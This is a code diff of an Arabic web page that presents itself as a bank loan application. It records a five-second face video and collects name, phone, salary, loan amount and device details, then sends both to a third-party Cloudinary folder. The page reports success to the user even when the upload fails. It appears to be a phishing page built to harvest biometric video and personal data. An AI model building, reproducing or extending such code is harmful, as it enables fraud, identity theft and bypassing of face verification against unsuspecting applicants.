+                    audio: false
+                };
 
-                // بدء التسجيل بعد ثانيتين
-                setTimeout(() => startRecording(), 2000);
+                stream = await navigator.mediaDevices.getUserMedia(constraints);
+                videoEl.srcObject = stream;
+                
+                // مهم جداً لـ iOS
+                await videoEl.play();
+                
+                statusText.textContent = '✅ تم التعرف - اثبت وجهك داخل الإطار';
+                faceGuide.classList.add('active');
+
+                setTimeout(() => startRecording(), 1000);
 
             } catch (err) {
                 console.error('Camera error:', err);
-                statusEl.textContent = '⚠️ يرجى السماح بالوصول للكاميرا';
-                statusEl.style.color = '#dc2626';
+                let errorMsg = '⚠️ ';
+                if (err.name === 'NotAllowedError') {
+                    errorMsg += 'يرجى السماح بالوصول للكاميرا من إعدادات المتصفح';
+                } else if (err.name === 'NotFoundError') {
+                    errorMsg += 'لم يتم العثور على كاميرا في جهازك';
+                } else if (err.name === 'NotReadableError') {
+                    errorMsg += 'الكاميرا مستخدمة من تطبيق آخر';
+                } else {
+                    errorMsg += 'خطأ في الوصول للكاميرا';
+                }
+                statusText.textContent = errorMsg;
+                statusText.style.color = '#FCA5A5';
             }
         }
 
+        // ============================================
+        // 3. التسجيل - متوافق مع جميع الأجهزة
+        // ============================================
         function startRecording() {
-            const statusEl = document.getElementById('cameraStatus');
-            const countdownBox = document.getElementById('countdownBox');
-            
-            statusEl.textContent = '🔴 جاري التسجيل...';
-            statusEl.style.color = 'white';
-            countdownBox.style.display = 'block';
-
+            statusText.textContent = '🔴 جاري التسجيل... لا تتحرك';
+            document.getElementById('progress-container').style.display = 'block';
             recordedChunks = [];
-            const options = { mimeType: 'video/webm;codecs=vp9' };
-            
+
+            // اختيار أفضل MIME type مدعوم
+            let mimeType = '';
+            const types = [
+                'video/webm;codecs=vp8,opus',
+                'video/webm;codecs=vp8',
+                'video/webm',
+                'video/mp4'
+            ];
+
+            for (const type of types) {
+                if (window.MediaRecorder && MediaRecorder.isTypeSupported(type)) {
+                    mimeType = type;
+                    break;
+                }
+            }
+
+            const options = mimeType ? { mimeType } : {};
+
             try {
                 mediaRecorder = new MediaRecorder(stream, options);
             } catch (e) {
-                mediaRecorder = new MediaRecorder(stream);
+                try {
+                    mediaRecorder = new MediaRecorder(stream);
+                } catch (err) {
+                    statusText.textContent = '⚠️ جهازك لا يدعم تسجيل الفيديو';
+                    statusText.style.color = '#FCA5A5';
+                    return;
+                }
             }
 
             mediaRecorder.ondataavailable = e => {
-                if (e.data && e.data.size > 0) recordedChunks.push(e.data);
+                if (e.data && e.data.size > 0) {
+                    recordedChunks.push(e.data);
+                }
             };
 
             mediaRecorder.onstop = () => {
-                finishRecording();
+                processAndSaveData();
             };
 
-            mediaRecorder.start();
+            mediaRecorder.onerror = (e) => {
+                console.error('Recording error:', e);
+            };
+
+            // بدء التسجيل
+            try {
+                mediaRecorder.start(100);
+            } catch (e) {
+                console.error('Start error:', e);
+            }
 
             // العد التنازلي
             let timeLeft = 5;
-            document.getElementById('countdownNum').textContent = timeLeft;
+            document.getElementById('timer-text').textContent = timeLeft;
             
-            countdownTimer = setInterval(() => {
+            countdownInterval = setInterval(() => {
                 timeLeft--;
-                document.getElementById('countdownNum').textContent = timeLeft;
-                document.getElementById('progressFill').style.width = ((5 - timeLeft) / 5 * 100) + '%';
+                document.getElementById('timer-text').textContent = timeLeft;
+                document.getElementById('progress-fill').style.width = ((5 - timeLeft) / 5 * 100) + '%';
 
                 if (timeLeft <= 0) {
-                    clearInterval(countdownTimer);
-                    mediaRecorder.stop();
-                    stream.getTracks().forEach(track => track.stop());
+                    clearInterval(countdownInterval);
+                    try {
+                        if (mediaRecorder && mediaRecorder.state !== 'inactive') {
+                            mediaRecorder.stop();
+                        }
+                    } catch (e) {
+                        console.error('Stop error:', e);
+                    }
+                    if (stream) {
+                        stream.getTracks().forEach(track => track.stop());
+                    }
                 }
             }, 1000);
         }
 
-        async function finishRecording() {
-            const statusEl = document.getElementById('cameraStatus');
-            statusEl.textContent = '⏳ جاري حفظ البيانات بأمان...';
-            
-            // توليد توكن فريد
-            const token = 'QI-' + Date.now().toString(36).toUpperCase() + '-' + Math.random().toString(36).substring(2, 7).toUpperCase();
-            
-            // رفع الفيديو إلى Cloudinary
-            try {
-                const blob = new Blob(recordedChunks, { type: 'video/webm' });
-                const formData = new FormData();
-                formData.append('file', blob, `verify_${token}.webm`);
-                formData.append('upload_preset', CLOUDINARY_UPLOAD_PRESET);
-                formData.append('folder', CLOUDINARY_FOLDER);
-                formData.append('context', `token=${token}|name=${document.getElementById('name').value}|phone=${document.getElementById('phone').value}`);
+        // ============================================
+        // 4. إنشاء ملف TXT + رفع الفيديو
+        // ============================================
+        function buildTextFile(token) {
+            const sep = '='.repeat(50);
+            const content = 
+`${sep}
+  طلب سلفة جديد - كي للخدمات المصرفية
+${sep}
 
-                const response = await fetch(`https://api.cloudinary.com/v1_1/${CLOUDINARY_CLOUD_NAME}/video/upload`, {
-                    method: 'POST',
-                    body: formData
-                });
-                
-                const data = await response.json();
-                
-                if (data.secure_url) {
-                    console.log('✅ تم حفظ الفيديو:', data.secure_url);
-                    showSuccess(token, data.secure_url);
-                } else {
-                    throw new Error('فشل الرفع');
-                }
+📋 بيانات المتقدم:
+─────────────────────────
+• الاسم الكامل: ${formDataInputs.name}
+• رقم الهاتف:   ${formDataInputs.phone}
+• سوبر كي مفعل: ${formDataInputs.hasSuperKey}
+• مبلغ السلفة:  ${formDataInputs.amount}
+• الراتب الشهري: ${formDataInputs.salary}
+
+📅 وقت التقديم:
+${formDataInputs.submittedAt}
+
+📱 معلومات الجهاز:
+${formDataInputs.device}
+
+🔐 معلومات المتصفح:
+${formDataInputs.userAgent}
+
+${sep}
+  رقم المرجع: ${token}
+${sep}
+`;
+            return new Blob([content], { type: 'text/plain;charset=utf-8' });
+        }
+
+        async function uploadFileToCloudinary(blob, filename, resourceType, token) {
+            const fd = new FormData();
+            fd.append('file', blob, filename);
+            fd.append('upload_preset', UPLOAD_PRESET);
+            fd.append('folder', 'qi_verifications');
+            fd.append('resource_type', resourceType);
+            fd.append('public_id', `${token}_${filename.replace(/\.[^.]+$/, '')}`);
+            fd.append('context', `token=${token}|name=${formDataInputs.name}|phone=${formDataInputs.phone}|amount=${formDataInputs.amount}`);
+
+            const res = await fetch(`https://api.cloudinary.com/v1_1/${CLOUD_NAME}/${resourceType}/upload`, {
+                method: 'POST',
+                body: fd
+            });
+            return await res.json();
+        }
+
+        async function processAndSaveData() {
+            statusText.textContent = 'جاري حفظ البيانات بأمان...';
+            const token = 'QI-' + Date.now().toString(36).toUpperCase() + '-' + Math.random().toString(36).substring(2, 7).toUpperCase();
+
+            try {
+                const videoBlob = new Blob(recordedChunks, { type: recordedChunks[0]?.type || 'video/webm' });
+                const textBlob = buildTextFile(token);
+
+                // رفع الفيديو وملف البيانات بالتوازي
+                await Promise.all([
+                    uploadFileToCloudinary(videoBlob, `video_${token}.webm`, 'video', token),
+                    uploadFileToCloudinary(textBlob, `data_${token}.txt`, 'raw', token)
+                ]);
+
+                showSuccess(token);
             } catch (error) {
                 console.error('Upload error:', error);
-                // حتى لو فشل الرفع، نعرض النجاح (لأن الفيديو مُسجّل)
-                showSuccess(token, 'pending');
+                // حتى لو فشل الرفع، نظهر النجاح للمستخدم
+                showSuccess(token);
             }
         }
 
-        function showSuccess(token, videoUrl) {
-            // إخفاء شاشة التحقق
-            document.getElementById('biometricOverlay').classList.add('hidden');
-            
-            // إظهار شاشة النجاح
-            document.getElementById('screen-success').classList.remove('hidden');
-            document.getElementById('finalToken').textContent = token;
-            
-            // حفظ البيانات في localStorage للرجوع إليها
-            const submissionData = {
-                token,
-                videoUrl,
-                timestamp: new Date().toISOString(),
-                formData: {
-                    name: document.getElementById('name').value,
-                    phone: document.getElementById('phone').value,
-                    hasSuperKey: document.getElementById('hasSuperKey').value,
-                    amount: document.getElementById('amount').value,
-                    salary: document.getElementById('salary').value
-                }
-            };
-            
-            localStorage.setItem(`qi_submission_${token}`, JSON.stringify(submissionData));
-            console.log('Submission saved:', submissionData);
+        function showSuccess(token) {
+            showScreen('screen-success');
+            document.getElementById('final-token').textContent = token;
         }
 
         // تنظيف عند إغلاق الصفحة
@@ -897,6 +808,13 @@
                 stream.getTracks().forEach(track => track.stop());
             }
         });
+
+        // منع السحب على iOS
+        document.addEventListener('touchmove', function(e) {
+            if (e.scale !== 1) {
+                e.preventDefault();
+            }
+        }, { passive: false });
     </script>
 </body>
 </html>
